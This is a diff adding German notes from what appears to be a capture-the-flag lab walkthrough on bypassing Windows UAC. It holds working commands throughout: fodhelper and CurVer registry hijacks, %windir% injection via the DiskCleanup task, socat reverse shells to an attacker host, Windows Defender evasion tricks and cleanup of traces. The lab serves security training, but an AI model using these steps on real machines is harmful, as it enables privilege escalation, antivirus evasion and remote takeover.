@@ -267,3 +267,325 @@ Um sich mit der Hintertür zu verbinden, können Sie folgenden Befehl verwenden:
 `nc MACHINE_IP 9999`
 
 Sobald verbunden, überprüfen wir, ob unser Benutzer Teil der Administratorengruppe ist und dass er mit einem Token mittlerer Integrität läuft:
+```shell
+user@kali$ nc MACHINE_IP 9999
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+myserver\attacker
+
+C:\Windows\system32>net user attacker | find "Local Group"
+Local Group Memberships      *Administrators       *Users                
+
+C:\Windows\system32>whoami /groups | find "Label"
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
+```
+
+Wir setzen die erforderlichen Registrierungswerte, um die Klasse ms-settings mit einer Reverse Shell zu verknüpfen. Zur Vereinfachung finden Sie eine Kopie von **socat** unter `c:\tools\socat\`. Sie können die folgenden Befehle verwenden, um die erforderlichen Registrierungsschlüssel von einer Standard-Eingabeaufforderung aus festzulegen:
+```cmd
+C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
+
+C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+The operation completed successfully.
+
+C:\> reg add %REG_KEY% /d %CMD% /f
+The operation completed successfully.
+```
+
+Beachten Sie, dass wir einen leeren Wert namens **DelegateExecute** erstellen müssen, damit die Klassenverknüpfung wirksam wird. Wenn dieser Registrierungswert nicht vorhanden ist, wird das Betriebssystem den Befehl ignorieren und stattdessen die systemweite Klassenverknüpfung verwenden.
+
+Wir richten einen Listener auf unserem Rechner mit netcat ein:
+
+`nc -lvp 4444`
+
+Anschließend führen wir **fodhelper.exe** aus, was wiederum die Ausführung unserer Reverse Shell auslöst:
+![2024-07-08-2f1aef0aa39ffcf9056999c999e43b8d.png](Bilder/2024-07-08-2f1aef0aa39ffcf9056999c999e43b8d.png)
+
+Die empfangene Shell läuft mit hoher Integrität, was anzeigt, dass wir die Benutzerkontensteuerung (UAC) erfolgreich umgangen haben.
+
+Um die "fodhelper"-Flagge abzurufen, verwenden Sie Ihre neue Shell und führen Sie aus:
+```cmd
+C:\> C:\flags\GetFlag-fodhelper.exe
+```
+
+**Hinweis: Beachten Sie, dass die Flagge nur zurückgegeben wird, wenn Sie UAC erfolgreich über "fodhelper" umgangen haben und nur von der resultierenden Shell mit hoher Integrität.**
+
+
+### Spuren beseitigen
+
+Durch die Ausführung dieses Exploits wurden einige Artefakte in Form von Registrierungsschlüsseln auf dem Zielsystem erstellt. Um eine Erkennung zu vermeiden, müssen wir die Spuren mit dem folgenden Befehl beseitigen:
+```cmd
+reg delete HKCU\Software\Classes\ms-settings\ /f
+```
+
+**Hinweis: Stellen Sie sicher, dass Sie den angegebenen Befehl ausführen, um zu vermeiden, dass Artefakte die folgenden Aufgaben beeinträchtigen.**
+
+## Fragen:
+Welche Flagge wird durch die Ausführung des "fodhelper"-Exploits zurückgegeben?
+```
+
+```
+
+# Task 5 - UAC: Verbesserung des Fodhelper-Exploits zur Umgehung von Windows Defender
+### Windows Defender
+
+Zur Vereinfachung ist auf dem Zielrechner Windows Defender deaktiviert. Was würde jedoch passieren, wenn er aktiviert wäre?
+
+Gehen Sie zunächst über Ihre GUI-Verbindung zu Ihrem Desktop und doppelklicken Sie auf das folgende Symbol, um Windows Defender zu aktivieren:
+![2024-07-08-a138ccd399c27bb922efcc266053c3a3.png](Bilder/2024-07-08-a138ccd399c27bb922efcc266053c3a3.png)
+
+Versuchen Sie nun erneut, "fodhelper" über die Backdoor-Verbindung auszunutzen, und beobachten Sie, was auf der GUI des Servers passiert. Sobald Sie den `(Default)` Wert in `HKCU\Software\Classes\ms-settings\Shell\Open\command` ändern, um Ihren Reverse-Shell-Befehl einzufügen, erscheint eine Windows Defender-Benachrichtigung:
+![2024-07-08-9ebebccbac675f6b66f98a16446d1859.png](Bilder/2024-07-08-9ebebccbac675f6b66f98a16446d1859.png)
+
+Wenn Sie die Benachrichtigung anklicken, können Sie die Details des Alarms einsehen, die einen UAC-Umgehungsversuch durch Ändern eines Registrierungswertes erwähnen:
+![2024-07-08-8faadca4b214e13d32a6e7979554dcdc.png](Bilder/2024-07-08-8faadca4b214e13d32a6e7979554dcdc.png)
+
+Wenn Sie den entsprechenden Wert in der Registrierung abfragen, werden Sie feststellen, dass er gelöscht wurde:
+```cmd
+C:\Windows\system32>reg query %REG_KEY% /v ""
+
+HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
+    (Default)    REG_SZ    (value not set)
+```
+
+Obwohl es nun so aussieht, als würde unser Exploit mit aktiviertem Windows Defender nicht funktionieren, prüfen Sie, was passiert, wenn Sie die gleichen Befehle mit einer kleinen Änderung ausführen (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
+```cmd
+C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
+
+C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+The operation completed successfully.
+
+C:\> reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY%
+HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
+    DelegateExecute    REG_SZ    
+    (Default)    REG_SZ    powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes
+```
+
+Wir haben eine schnelle Abfrage des beanstandeten Registrierungswertes unmittelbar nach dem Setzen auf den für unsere Reverse-Shell erforderlichen Befehl hinzugefügt. Überraschenderweise gibt die Abfrage unseren Befehl unverändert zurück. Wir werden weiterhin von Windows Defender benachrichtigt, und eine Sekunde später wird der beanstandete Registrierungswert wie erwartet gelöscht. Es scheint, dass Windows Defender einen Moment braucht, um auf unseren Exploit zu reagieren. Stellen Sie also einen Reverse-Listener auf dem Angreifer-Rechner ein:
+`nc -lvp 4444`
+
+Und ändern Sie den Exploit so, dass "fodhelper.exe" sofort nach dem Setzen des Registrierungswertes ausgeführt wird. Wenn der Befehl schnell genug ausgeführt wird, funktioniert es einfach (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
+```cmd
+C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
+
+C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+The operation completed successfully.
+
+C:\> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+```
+
+Je nach Glück könnte "fodhelper" ausgeführt werden, bevor der Virenschutz anspringt, und Ihnen eine Reverse-Shell zurückgeben. Falls es aus irgendeinem Grund nicht funktioniert, beachten Sie, dass diese Methode unzuverlässig ist, da sie von einem Wettlauf zwischen dem Virenschutz und der Ausführung Ihres Payloads abhängt. Sollte die Reverse-Shell nicht funktionieren, fahren Sie einfach mit dem Rest der Anleitung fort, da weiter unten eine konsistentere Methode zur Umgehung von Windows Defender vorgestellt wird.
+```shell
+user@kali$ nc -lvp 4444      
+Listening on 0.0.0.0 4444
+Connection received on 10.10.183.127 49813
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
+```
+
+Windows Defender warnt weiterhin vor der Umgehung. Das Problem bei unserem aktuellen Exploit ist, dass er wenig Spielraum für Variationen lässt, da wir spezifische Registrierungsschlüssel schreiben müssen, um ihn auszulösen, was es Windows Defender leicht macht, ihn zu erkennen. Aber es gibt noch etwas, das wir dagegen tun können.
+
+### Verbesserung des "fodhelper"-Exploits
+
+Eine Variation des "fodhelper"-Exploits wurde von [@V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses) vorgeschlagen, bei der andere Registrierungsschlüssel verwendet werden, aber das Grundprinzip dasselbe bleibt.
+
+Anstatt unser Payload in `HKCU\Software\Classes\ms-settings\Shell\Open\command` zu schreiben, verwenden wir den Eintrag `CurVer` unter einem "progID"-Registrierungsschlüssel. Dieser Eintrag wird verwendet, wenn Sie mehrere Instanzen einer Anwendung mit verschiedenen Versionen auf demselben System ausführen. "CurVer" ermöglicht es Ihnen, auf die Standardversion der Anwendung zu verweisen, die von Windows beim Öffnen eines bestimmten Dateityps verwendet werden soll.
+
+Zu diesem Zweck erstellen wir einen Eintrag in der Registrierung für eine neue "progID" unserer Wahl (jeder Name ist möglich) und verweisen dann im "ms-settings progID" Eintrag "CurVer" auf unsere neu erstellte "progID". Auf diese Weise, wenn "fodhelper" versucht, ein Programm mit dem "ms-settings progID" zu öffnen, wird es den "CurVer"-Eintrag bemerken, der auf unsere neue "progID" verweist, und überprüfen, welchen Befehl es verwenden soll.
+
+Der von @V3ded vorgeschlagene Exploit-Code verwendet PowerShell, um dies zu erreichen. Hier ist eine angepasste Version davon, um unsere Reverse-Shell zu verwenden (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
+```powershell
+$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
+
+New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+    
+New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+    
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+```
+
+Dieser Exploit erstellt eine neue progID mit dem Namen **.pwn** und verknüpft unser Payload mit dem Befehl, der beim Öffnen solcher Dateien verwendet wird. Dann verweist er den CurVer Eintrag von ms-settings auf unsere .pwn progID. Wenn "fodhelper" versucht, ein ms-settings Programm zu öffnen, wird es stattdessen auf die .pwn progID verwiesen und verwendet den zugehörigen Befehl.
+
+Diese Technik ist wahrscheinlicher, Windows Defender zu umgehen, da wir mehr Freiheit haben, wo wir unser Payload platzieren, da der Name der "progID", die unser Payload enthält, völlig willkürlich ist. Starten wir eine neue Reverse-Shell auf dem Angreifer-Rechner:
+`nc -lvp 4445`
+
+Und führen den Exploit von unserer Backdoor-Verbindung aus. Als Ergebnis wird Windows Defender einen weiteren Alarm auslösen, der auf unsere Aktionen verweist:
+![2024-07-08-36a12bfed5c44fedf170f934bd4bc9ca.png](Bilder/2024-07-08-36a12bfed5c44fedf170f934bd4bc9ca.png)
+
+Obwohl wir weiterhin erkannt werden, ist es wichtig zu beachten, dass die Erkennungsmethoden von Antivirensoftware manchmal streng gegen den veröffentlichten Exploit implementiert werden, ohne mögliche Variationen zu berücksichtigen. Wenn wir unseren Exploit von PowerShell auf cmd.exe übersetzen, wird der Virenschutz keine Alarme auslösen (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
+```cmd
+C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
+
+C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+The operation completed successfully.
+
+C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+The operation completed successfully.
+
+C:\> fodhelper.exe
+```
+
+Und wir erhalten eine Reverse-Shell mit hoher Integrität:
+```shell
+user@kali$ nc -lvp 4445      
+Listening on 0.0.0.0 4445
+Connection received on 10.10.183.127 23441
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
+```
+
+Um die "fodhelper-curver"-Flagge abzurufen, verwenden Sie Ihre neue Shell und führen Sie folgenden Befehl aus:
+```cmd
+C:\> C:\flags\GetFlag-fodhelper-curver.exe
+```
+
+**Hinweis: Beachten Sie, dass die Flagge nur zurückgegeben wird, wenn Sie die UAC erfolgreich über "fodhelper" umgangen haben und nur von der resultierenden Shell mit hoher Integrität über "socat".**
+
+### Spuren beseitigen
+
+Durch die Ausführung dieses Exploits wurden einige Artefakte auf dem Zielsystem erstellt, wie beispielsweise Registrierungsschlüssel. Um eine Erkennung zu vermeiden, müssen wir die Spuren mit den folgenden Befehlen beseitigen:
+```cmd
+reg delete "HKCU\Software\Classes\.thm\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f
+```
+
+**Hinweis: Stellen Sie sicher, dass Sie die angegebenen Befehle ausführen, um zu vermeiden, dass Artefakte die folgenden Aufgaben beeinträchtigen.**
+
+## Fragen:
+Welche Flagge wird durch die Ausführung des "fodhelper-curver"-Exploits zurückgegeben?
+```
+
+```
+
+# Task 6 - UAC: Erweiterung der Umgebungsvariablen
+### Umgehung der Einstellung "Immer benachrichtigen"
+
+Wie im vorherigen Abschnitt gezeigt, können Sie in den Standardeinstellungen von Windows Anwendungen, die mit der Systemkonfiguration zusammenhängen, ausnutzen, um die Benutzerkontensteuerung (UAC) zu umgehen, da die meisten dieser Apps das Flag "autoElevate" in ihren Manifesten gesetzt haben. Wenn UAC jedoch auf die Stufe "Immer benachrichtigen" konfiguriert ist, können "fodhelper" und ähnliche Apps nicht genutzt werden, da der Benutzer aufgefordert wird, den UAC-Dialog zu bestätigen, um die Rechte zu erhöhen. Dies würde mehrere bekannte Umgehungsmethoden verhindern, aber es gibt dennoch Hoffnung.
+
+Für die folgende Technik werden wir eine geplante Aufgabe missbrauchen, die von jedem Benutzer ausgeführt werden kann, jedoch mit den höchsten dem Anrufer verfügbaren Rechten ausgeführt wird. Geplante Aufgaben sind ein interessantes Ziel. Sie sind so konzipiert, dass sie ohne Benutzerinteraktion ausgeführt werden (unabhängig vom UAC-Sicherheitslevel), sodass das manuelle Erhöhen eines Prozesses durch den Benutzer keine Option ist. Geplante Aufgaben, die eine Erhöhung der Rechte erfordern, erhalten diese automatisch, ohne dass ein UAC-Dialog durchlaufen wird.
+
+### Fallstudie: Geplante Aufgabe "Datenträgerbereinigung"
+
+**Hinweis: Deaktivieren Sie Windows Defender für diese Aufgabe, da es sonst zu Schwierigkeiten beim Ausführen des Exploits kommen kann. Verwenden Sie einfach die auf dem Desktop Ihres Rechners bereitgestellte Verknüpfung, um ihn zu deaktivieren.**
+
+Um zu verstehen, warum wir die Datenträgerbereinigung auswählen, öffnen wir den **Task Scheduler** und überprüfen die Konfiguration der Aufgabe:
+![2024-07-08-24b5ce8c9a6cb1194ed66054bc2ed09e.png](Bilder/2024-07-08-24b5ce8c9a6cb1194ed66054bc2ed09e.png)
+
+Hier sehen wir, dass die Aufgabe so konfiguriert ist, dass sie mit dem **Benutzerkonto** ausgeführt wird, was bedeutet, dass sie die Rechte des aufrufenden Benutzers erbt. Die Option "Mit höchsten Privilegien ausführen" verwendet das höchste Privileg-Sicherheitstoken, das dem aufrufenden Benutzer zur Verfügung steht, was für einen Administrator ein Token mit hoher Integritätsstufe (IL) ist. Beachten Sie, dass, wenn ein normaler Benutzer ohne Administratorrechte diese Aufgabe aufruft, sie nur mit mittlerer IL ausgeführt wird, da dies das höchste Privileg ist, das Nicht-Administratoren zur Verfügung steht, und daher die Umgehung nicht funktionieren würde.
+
+Überprüfen Sie die Registerkarten "Aktionen" und "Einstellungen", wir haben Folgendes:
+![2024-07-08-3b8dd4c6a441eb19620bc3bedd536a8b.png](Bilder/2024-07-08-3b8dd4c6a441eb19620bc3bedd536a8b.png)
+
+Die Aufgabe kann auf Abruf ausgeführt werden und führt beim Aufruf den folgenden Befehl aus:
+
+`%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`
+
+Da der Befehl von Umgebungsvariablen abhängt, könnten wir möglicherweise Befehle durch sie injizieren und sie ausführen lassen, indem wir die Datenträgerbereinigungsaufgabe manuell starten.
+
+Glücklicherweise können wir die Variable `%windir%` über die Registrierung überschreiben, indem wir einen Eintrag in `HKCU\Environment` erstellen. Wenn wir eine Reverse-Shell mit socat ausführen möchten, können wir `%windir%` wie folgt festlegen (ohne die Anführungszeichen):
+
+`"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "`
+
+Am Ende unseres Befehls fügen wir "&REM " (mit einem Leerzeichen am Ende) hinzu, um alles, was nach `%windir%` steht, zu kommentieren, wenn die Umgebungsvariable erweitert wird, um den endgültigen Befehl zu erhalten, der von der Datenträgerbereinigung verwendet wird. Der resultierende Befehl wäre (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
+
+`cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%`
+
+Wobei alles nach "REM" als Kommentar ignoriert wird.
+
+### Alles zusammenfügen
+
+Richten wir einen Listener für eine Reverse-Shell mit nc ein:
+`nc -lvp 4446`
+
+Dann verbinden wir uns mit der Backdoor auf Port 9999:
+`nc MACHINE_IP 9999`
+
+Und führen schließlich die folgenden Befehle aus, um unser Payload in `%windir%` zu schreiben und dann die Datenträgerbereinigungsaufgabe auszuführen (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
+```cmd
+C:\> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
+
+C:\> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+```
+
+Als Ergebnis sollten Sie eine Shell mit hoher IL erhalten:
+```shell
+user@kali$ nc -lvp 4446      
+Listening on 0.0.0.0 4446
+Connection received on 10.10.183.127 25631
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
+```
+
+Um die "DiskCleanup"-Flagge abzurufen, verwenden Sie Ihre neue Shell und führen Sie folgenden Befehl aus:
+```cmd
+C:\flags\GetFlag-diskcleanup.exe
+```
+
+**Hinweis: Beachten Sie, dass die Flagge nur zurückgegeben wird, wenn Sie UAC erfolgreich über "diskcleanup" umgangen haben und nur von der resultierenden Shell mit hoher Integrität über "socat".**
+
+### Spuren beseitigen
+
+Durch die Ausführung dieses Exploits wurden einige Artefakte auf dem Zielsystem erstellt, wie beispielsweise Registrierungsschlüssel. Um eine Erkennung zu vermeiden, müssen wir die Spuren mit folgendem Befehl beseitigen:
+```cmd
+reg delete "HKCU\Environment" /v "windir" /f
+```
+
+**Hinweis: Stellen Sie sicher, dass Sie den angegebenen Befehl ausführen, um zu vermeiden, dass Artefakte die folgenden Aufgaben beeinträchtigen. Da viele Windows-Komponenten auf die Umgebungsvariable %windir% angewiesen sind, werden viele Dinge nicht richtig funktionieren, bis Sie den für diese Umgehung verwendeten Registrierungsschlüssel entfernen.**
+
+## Fragen:
+Welche Flagge wird durch die Ausführung des "DiskCleanup"-Exploits zurückgegeben?
+```
+
+```
+
+# Task 7 - Automatisierter Exploit
+Automatisierung von UAC-Umgehungen
+
+Ein hervorragendes Tool zum Testen von UAC-Umgehungen, ohne die Exploits von Grund auf neu schreiben zu müssen, steht zur Verfügung. Erstellt von @hfiref0x, bietet UACME ein aktuelles Repository von UAC-Umgehungstechniken, die sofort verwendet werden können. Das Tool ist im offiziellen Repository verfügbar unter:
+
+[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
+
+Während UACME mehrere Werkzeuge bereitstellt, konzentrieren wir uns hauptsächlich auf das Tool namens Akagi, das die eigentlichen UAC-Umgehungen durchführt. Eine kompilierte Version von Akagi finden Sie unter C:\tools\UACME-Akagi64.exe.
+
+Die Verwendung des Tools ist unkompliziert und erfordert lediglich die Angabe der Nummer, die der zu testenden Methode entspricht. Eine vollständige Liste der Methoden ist in der Projektbeschreibung auf GitHub verfügbar. Wenn Sie Methode 33 testen möchten, können Sie dies folgendermaßen über die Eingabeaufforderung tun, und eine cmd.exe mit hoher Integrität wird angezeigt:
+```cmd
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\attacker>cd /tools
+
+C:\tools>UACME-Akagi64.exe 33
+```
+
+Die in diesem Raum vorgestellten Methoden können ebenfalls von UACME getestet werden, indem die folgenden Methoden verwendet werden:
+| Methoden-ID | Umgehungstechnik                          |
+|-------------|-------------------------------------------|
+| 33          | fodhelper.exe                             |
+| 34          | Geplante Aufgabe "Datenträgerbereinigung" |
+| 70          | fodhelper.exe unter Verwendung des CurVer-Registrierungsschlüssels |
+
+# Task 8 - Abschluss
+Wir haben in diesem Raum mehrere Methoden zur Umgehung der Benutzerkontensteuerung (UAC) in Windows-Systemen gezeigt. Während die meisten dieser Methoden mit automatischen Tools verbunden sind, werden sie von jeder auf dem Markt erhältlichen Antivirensoftware leicht erkannt, wenn sie unverändert verwendet werden. Das Wissen über die tatsächlichen Methoden verschafft Ihnen als Angreifer einen Vorteil, da Sie Ihre Exploits nach Bedarf anpassen und sie schwerer erkennbar machen können.
+
+Wie wir gesehen haben, wird UAC nicht als Sicherheitsgrenze betrachtet und ist daher anfällig für mehrere Umgehungsmethoden.
+
+Sollten Sie daran interessiert sein, weitere Techniken zu erlernen, stehen Ihnen die folgenden Ressourcen zur Verfügung:
+
+- [UACME GitHub Repository]([https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME))
+- [Bypassing UAC with Mock Folders and DLL Hijacking]([https://example.com](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/))
+- [Reading Your Way Around UAC]([https://example.com](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html))
